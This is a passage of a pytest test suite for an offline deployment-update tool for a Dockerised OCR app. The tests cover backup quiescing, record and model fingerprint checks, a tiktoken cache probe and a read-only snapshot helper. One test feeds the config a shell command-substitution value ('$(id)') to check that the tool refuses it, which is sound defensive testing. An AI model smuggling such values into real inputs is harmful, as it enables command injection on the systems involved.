    assert "APP_ENV_OVERRIDES is deprecated" in out and "BACKUP_MAX_AGE_MINUTES is obsolete" in out
    conf.write_text("REQUIRED_APP_ENV=OCR_X=1\nAPP_ENV_OVERRIDES=OCR_OFFLINE=true\n")
    assert OP.load_config(str(conf))["REQUIRED_APP_ENV"] == "OCR_X=1"
    conf.write_text("")
    assert OP.required_env(OP.load_config(str(conf))) == {
        "OCR_RAPIDOCR_PERSISTENT": "true", "OCR_OFFLINE": "true",
    }  # fmt: skip
    conf.write_text("REQUIRED_APP_ENV=OCR_X=$(id)\n")
    with pytest.raises(OP.Refused):
        OP.required_env(OP.load_config(str(conf)))


def test_exit_codes_are_documented():
    assert (OP.EXIT_DRIFT, OP.EXIT_UNDECIDED) == (7, 8)
    assert "7  DRIFT" in OP.__doc__ and "8  UNDECIDED" in OP.__doc__
    assert "(exit 0 / 7 / 8)" in " ".join(OP.build_parser().format_help().split())


# --------------------------------------------------------------------------- #
# Phase 12D5: quiesce, fingerprints around the backup (R2-04)
# --------------------------------------------------------------------------- #


def test_jobs_still_running_in_maintenance_stop_the_update_before_the_backup(
    deployment, fake_docker, tmp_path, capsys
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    _set_conf(conf, JOBS_WAIT_SECONDS="20")
    fake_docker.set(on_quiesce={"jobs": 3})  # work started before maintenance goes on
    capsys.readouterr()
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert "STAYS in maintenance" in capsys.readouterr().out
    assert _backups(marker) == 0 and not _update_ups(fake_docker)
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert _status(conf) == OP.EXIT_UNDECIDED
    assert "left there by this attempt" in capsys.readouterr().out
    fake_docker.set(jobs=0)
    assert _server("update", conf, pkg_dir, "--apply") == 0 and _backups(marker) == 1


def test_a_record_edited_after_the_backup_stops_the_update_before_the_recreate(
    deployment, fake_docker, tmp_path, monkeypatch
):
    """F3 (right before the new image starts) must equal F1 (the backup): an edited
    record - same ids, same count - is a change too."""
    conf, pkg_dir, _ = deployment
    real = OP.rapidocr_to_volume

    def and_somebody_edits_a_note(*a, **k):
        real(*a, **k)
        fake_docker.edit(lambda s: s.setdefault("touched", {}).update(note=["note:1"]))

    monkeypatch.setattr(OP, "rapidocr_to_volume", and_somebody_edits_a_note)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    assert "F3_fingerprint" not in [s["step"] for s in _journal(tmp_path)["steps"]]


def test_model_file_with_the_same_size_but_another_content_fails_the_update(
    deployment, fake_docker, tmp_path, capsys
):
    """F-22 / R2-10: model files are compared by SHA-256, not only by name and size."""
    conf, pkg_dir, _ = deployment
    after = fake_docker.get()["artifacts"]
    after["ocr_models"][3][2] = "0" * 64  # tesseract/best/vie.traineddata, same size
    fake_docker.set(on_up={"artifacts": after})
    capsys.readouterr()
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert "content changed, same size" in capsys.readouterr().out
    assert _journal(tmp_path)["status"] == "failed"


# --------------------------------------------------------------------------- #
# Phase 12D5: the token probe of the health check (R2-10, tool side)
# --------------------------------------------------------------------------- #


def _token_probe(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    assert OP.main(["health", "--config", str(conf)]) == 0
    call = next(c for c in fake_docker.calls() if "get_encoding" in " ".join(c))
    return call[call.index("-c") + 1]


FAKE_TIKTOKEN = '''
import os
MODE = os.environ["FAKE_TIKTOKEN"]
class Encoding:
    name = "o200k_base"
    n_vocab = 200019
    def encode(self, text):
        self.last = text
        return [0] if MODE == "estimate" else list(range(len(text) // 3))
    def decode(self, ids):
        return self.last
def get_encoding(name):
    if MODE == "raise":
        raise OSError("network unreachable")
    return Encoding()
'''


@pytest.mark.parametrize(
    "case, rc",
    [("real", 0), ("no-cache-file", 1), ("other-file", 1), ("raise", 1), ("estimate", 1)],
)
def test_token_probe_asserts_the_cached_encoding_itself(deployment, fake_docker, tmp_path, case, rc):
    """The probe that runs in the new container: the cache file tiktoken reads must be
    the o200k_base blob byte for byte (SHA-256), and tiktoken.get_encoding must load and
    really tokenise - a word-count estimate (1 token for a long text) fails."""
    code = _token_probe(deployment, fake_docker)
    cache = tmp_path / "tiktoken-cache"
    cache.mkdir()
    name = hashlib.sha1(OP.TIKTOKEN_BLOB_URL.encode()).hexdigest()
    content = b"the o200k_base encoding"
    if case != "no-cache-file":
        (cache / name).write_bytes(content if case != "other-file" else b"something else")
    code = code.replace(repr(OP.TIKTOKEN_BLOB_SHA256), repr(hashlib.sha256(content).hexdigest()))
    fake_module = tmp_path / "fake_modules"
    fake_module.mkdir()
    (fake_module / "tiktoken.py").write_text(FAKE_TIKTOKEN)
    env = dict(os.environ, PYTHONPATH=str(fake_module), TIKTOKEN_CACHE_DIR=str(cache),
               FAKE_TIKTOKEN={"estimate": "estimate", "raise": "raise"}.get(case, "real"))  # fmt: skip
    proc = subprocess.run([sys.executable, "-c", code], env=env, capture_output=True, text=True)
    assert proc.returncode == rc, proc.stdout + proc.stderr


# --------------------------------------------------------------------------- #
# Phase 12D5: the read-only snapshot helper of the manual fallback procedure
# --------------------------------------------------------------------------- #


def test_snapshot_records_and_compares_without_changing_anything(
    deployment, fake_docker, tmp_path, capsys
):
    conf, _, _ = deployment
    before = tmp_path / "before.json"
    start = len(fake_docker.calls())
    assert OP.main(["snapshot", "--config", str(conf), "--out", str(before)]) == 0
    calls = fake_docker.calls()[start:]
    _assert_safe_calls(calls)
    assert not [c for c in calls if c[0] in ("tag", "load") or "up" in c]
    assert not (tmp_path / "state" / "journal.json").exists()
    assert not (tmp_path / "state" / "update.lock").exists()  # no lock either
    snap = json.loads(before.read_text())
    assert (before.stat().st_mode & 0o077) == 0  # record ids: private
    assert snap["counts"]["source"] == 120 and snap["records"]["source"][0] == "source:1"
    assert snap["db"]["container_id"] == "db-container-original"
    assert snap["deploy_tag"] == {"ref": DEPLOY_TAG, "image_id": OLD_ID}
    assert snap["app"]["image_id"] == OLD_ID and snap["app"]["required_env_missing"] == []
    assert "SURREAL_URL" in snap["app"]["env_keys"]
    assert "ws://" not in before.read_text()  # environment NAMES only, never values
    assert len(snap["artifacts"]["ocr_models"][0]) == 3  # name, size, SHA-256

    def compare():
        return OP.main(["snapshot", "--config", str(conf), "--compare", str(before)])

    assert compare() == 0
    fake_docker.edit(lambda s: s["counts"].update(source=125))  # additions: reported, fine
    capsys.readouterr()
    assert compare() == 0 and "added source: 5" in capsys.readouterr().out
    fake_docker.edit(
        lambda s: s.setdefault("records", {}).update(
            source=[f"source:{i}" for i in range(2, 126)]
        )
    )  # source:1 is gone
    assert compare() == OP.EXIT_UPDATE
    fake_docker.edit(lambda s: s["records"].pop("source"))
    assert compare() == 0
    fake_docker.edit(lambda s: s["artifacts"]["ocr_models"][0].__setitem__(2, "f" * 64))
    assert compare() == OP.EXIT_UPDATE  # a model file changed
    fake_docker.set(fail=["FINGERPRINT"])
    assert compare() == OP.EXIT_VERIFY  # unreadable
    assert OP.main(["snapshot", "--config", str(conf), "--compare", str(tmp_path / "nope")]) == OP.EXIT_VERIFY


def test_snapshot_wrapper_only_delegates():
    text = (ROOT / "scripts" / "offline" / "snapshot.sh").read_text()
    code = "\n".join(x for x in text.splitlines() if not x.startswith("#"))
    assert 'exec python3 "$HERE/offline_package.py" snapshot "$@"' in code
    assert "rm -" not in code and "down" not in code
    assert os.access(ROOT / "scripts" / "offline" / "snapshot.sh", os.X_OK)
